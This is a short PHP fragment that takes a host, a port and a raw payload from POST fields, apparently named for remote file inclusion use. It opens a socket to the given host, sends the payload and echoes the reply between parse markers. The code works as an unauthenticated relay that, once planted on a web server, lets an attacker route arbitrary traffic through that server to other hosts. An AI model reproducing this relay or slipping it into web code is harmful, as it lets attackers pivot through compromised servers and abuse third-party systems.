$send = $_POST['rfipsend'];
$host = $_POST['rfihost'];
$port = $_POST['rfiport'];
$separator = $_POST['rfipsep'];
$http_response = "";

	// Print the initial separator for parsing
	echo "\n" . $separator. "\n";

	$fp = fsockopen($host, $port);
	if ( ! $fp ){
		// Error
		echo "Cant connect to " . $host . ":" . $port;		
	}
	else
	{
		fputs($fp, $send );

		// Receive response
		while (!feof($fp)) $http_response .= fgets($fp, 3);
		fclose($fp);
	
		// Print $http_response
		echo $http_response;

		// Print the final separator for parsing
		echo "\n" . $separator. "\n";
	}
